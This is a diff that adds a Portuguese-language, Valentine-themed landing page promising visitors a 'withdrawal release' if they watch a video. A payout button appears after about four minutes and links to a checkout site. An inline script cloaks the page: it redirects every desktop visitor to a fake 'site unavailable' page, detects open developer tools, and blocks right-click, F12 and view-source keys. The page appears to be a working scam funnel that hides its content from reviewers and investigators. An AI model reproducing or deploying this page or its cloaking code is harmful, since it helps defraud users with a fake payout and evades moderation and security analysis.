@@ -1,0 +1,281 @@
+<!DOCTYPE html><html lang="pt"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Liberação de Saque</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+
+fbq('init', '1397684491501570');
+fbq('track', 'PageView');
+</script>
+
+<noscript>
+<img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1397684491501570&ev=PageView&noscript=1"/>
+</noscript>
+<!-- End Meta Pixel Code -->
+
+<script>
+(function() {
+
+  const target = "https://site-indisponivel.vercel.app/";
+
+  // Detectar se é mobile real
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
+                   .test(navigator.userAgent);
+
+  // Função para detetar DevTools
+  function isDevToolsOpen() {
+    let opened = false;
+
+    // Método 1 - diferença normal entre outerHeight e innerHeight
+    if (window.outerHeight - window.innerHeight > 160) {
+      opened = true;
+    }
+
+    // Método 2 - largura anormal da janela por causa do device toolbar
+    if (window.outerWidth - window.innerWidth > 160) {
+      opened = true;
+    }
+
+    // Método 3 - atraso causado pelo "debugger"
+    const t0 = performance.now();
+    debugger;
+    const t1 = performance.now();
+    if (t1 - t0 > 200) {
+      opened = true;
+    }
+
+    return opened;
+  }
+
+
+  // ==========================================================
+  // NOVA REGRA: PC EM MODO MOBILE (DevTools mobile) → BLOQUEAR
+  // ==========================================================
+  if (!isMobile) {   // só PC
+
+    // Se DevTools está aberto ANTES da página abrir → redireciona
+    if (isDevToolsOpen()) {
+      window.location.replace(target);
+    }
+
+    // Monitor contínuo — garante que qualquer tentativa é apanhada
+    setInterval(function() {
+      if (isDevToolsOpen()) {
+        window.location.replace(target);
+      }
+    }, 300);
+  }
+
+
+
+  // ======================
+  // JÁ EXISTIA: bloqueio total só para DESKTOP real
+  // ======================
+  if (!isMobile) {
+
+    try {
+      window.location.replace(target);
+    } catch (e) {
+      window.location.href = target;
+    }
+
+    // Bloqueio de clique direito
+    document.addEventListener("contextmenu", e => e.preventDefault());
+
+    // Bloqueio de teclas
+    document.onkeydown = function(e) {
+      if (e.keyCode === 123) return false; // F12
+      if (e.ctrlKey && e.shiftKey && [73,67,74].includes(e.keyCode)) return false; 
+      if (e.ctrlKey && e.keyCode === 85) return false; // Ctrl+U
+    };
+
+    // DevTools detection (já existente)
+    setInterval(function() {
+      const start = performance.now();
+      debugger;
+      const end = performance.now();
+      if (end - start > 200) {
+        window.location.replace(target);
+      }
+    }, 500);
+
+    // Altura da janela (já existente)
+    setInterval(function() {
+      if (window.outerHeight - window.innerHeight > 160) {
+        window.location.replace(target);
+      }
+    }, 300);
+
+    return;
+  }
+
+
+  // ======================
+  // MOBILE REAL
+  // ======================
+  // Aqui não tocamos. Tudo normal.
+
+})();
+</script>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    font-family:'Poppins', sans-serif;
+    background:#f5eeee;
+    text-align:center;
+    overflow-x:hidden;
+}
+
+.container{
+    padding:30px 15px;
+}
+
+.titulo{
+    font-size:22px;
+    font-weight:700;
+}
+
+.subtitulo{
+    color:#ff2d55;
+    font-size:16px;
+    margin-top:5px;
+    font-weight:600;
+}
+
+/* Vídeo responsivo */
+.video-wrapper{
+    margin:30px auto;
+    width:100%;
+    max-width:800px;
+    position:relative;
+    padding-bottom:56.25%;
+    height:0;
+    border-radius:15px;
+    overflow:hidden;
+    box-shadow:0px 8px 25px rgba(0,0,0,0.15);
+}
+
+.video-wrapper iframe{
+    position:absolute;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+}
+
+/* BOTÃO IGUAL AO DA IMAGEM */
+.botao-container{
+    display:none;
+    margin:35px auto;
+    padding:0 15px;
+}
+
+.botao-saque{
+    display:block;
+    width:100%;
+    max-width:750px;
+    margin:0 auto;
+    padding:18px 20px;
+    font-size:18px;
+    font-weight:600;
+    color:#fff;
+    text-decoration:none;
+    border:none;
+    border-radius:50px;
+    background:linear-gradient(90deg,#ff2d55,#ff5f7e);
+    box-shadow:0px 8px 20px rgba(255,45,85,0.4);
+    transition:0.3s;
+}
+
+.botao-saque:hover{
+    transform:translateY(-2px);
+}
+
+/* Corações */
+.coracao{
+    position:fixed;
+    bottom:-40px;
+    font-size:20px;
+    animation:flutuar linear infinite;
+    opacity:0.8;
+    pointer-events:none;
+}
+
+@keyframes flutuar{
+    0%{transform:translateY(0) translateX(0);opacity:1;}
+    100%{transform:translateY(-110vh) translateX(40px);opacity:0;}
+}
+
+@media(min-width:768px){
+    .titulo{font-size:26px;}
+    .subtitulo{font-size:18px;}
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+    <div class="titulo">🎬 Assista esse vídeo até ao final</div>
+    <div class="subtitulo">e libere o seu saque</div>
+
+    <div class="video-wrapper">
+        <iframe src="https://scripts.converteai.net/0d9a9a9b-7f59-424a-928e-200d3b689d94/players/698bb5699a130410492bb072/v4/embed.html" frameborder="0" allow="autoplay; fullscreen" allowfullscreen="">
+        </iframe>
+    </div>
+
+    <!-- BOTÃO -->
+    <div class="botao-container" id="botaoContainer">
+        <a href="https://checkout-saque-sao-valentim.vercel.app/" class="botao-saque">
+            🔓 Liberar o saque 💖
+        </a>
+    </div>
+</div>
+
+<script>
+// Corações animados
+const modelos = ["💖","💘","💝","💕","❤️","💓","💗"];
+
+function criarCoracao(){
+    const coracao = document.createElement("div");
+    coracao.classList.add("coracao");
+    coracao.innerHTML = modelos[Math.floor(Math.random()*modelos.length)];
+    coracao.style.left = Math.random() * 100 + "vw";
+    coracao.style.fontSize = (Math.random() * 15 + 15) + "px";
+    coracao.style.animationDuration = (Math.random() * 5 + 6) + "s";
+    document.body.appendChild(coracao);
+
+    setTimeout(()=>{coracao.remove();},10000);
+}
+setInterval(criarCoracao, 500);
+
+
+// ⏳ BOTÃO APARECE APÓS 4min 19seg (259 segundos)
+setTimeout(function(){
+    document.getElementById("botaoContainer").style.display = "block";
+}, 259000); // 259000 milissegundos
+
+</script>
+
+
+
+
+</body></html>
